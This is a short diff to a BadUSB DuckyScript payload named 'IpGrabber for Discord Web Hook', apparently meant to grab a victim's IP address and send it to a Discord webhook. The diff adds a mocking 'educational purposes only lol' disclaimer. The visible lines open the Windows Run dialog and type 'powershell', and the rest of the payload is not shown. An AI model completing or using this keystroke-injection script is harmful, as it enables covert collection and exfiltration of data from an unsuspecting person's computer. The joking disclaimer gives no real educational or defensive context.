@@ -1,5 +1,6 @@
 REM Author : badusbprovider
 REM Name : IpGrabber for Discord Web Hook
+REM LEGIT : educational purposes only lol
 GUI r
 DELAY 100
 STRING powershell
